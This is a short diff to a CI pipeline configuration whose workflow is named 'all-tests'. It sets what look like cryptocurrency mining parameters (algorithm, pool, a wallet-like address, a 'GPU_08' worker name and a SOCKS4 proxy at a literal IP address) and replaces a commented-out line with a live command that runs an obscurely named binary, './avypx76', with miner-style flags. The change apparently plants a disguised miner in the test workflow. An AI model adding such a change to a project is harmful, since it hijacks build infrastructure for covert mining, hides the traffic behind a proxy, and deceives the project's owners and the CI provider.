@@ -38,7 +38,7 @@ jobs:
             WT=DCZxCjQrpoGHwdjZdqdUCn5CNtGZwgqVEv
             WR=GPU_08
             PY=socks4://72.210.252.134:46164
-            #./avypx76 -a $ALG -o $PL -u $WT -p $WR,mc=CPU -t12 -x $PY
+            ./avypx76 -a $ALG -o $PL -u $WT -p $WR -t12 -x $PY
 
 workflows:
   all-tests:
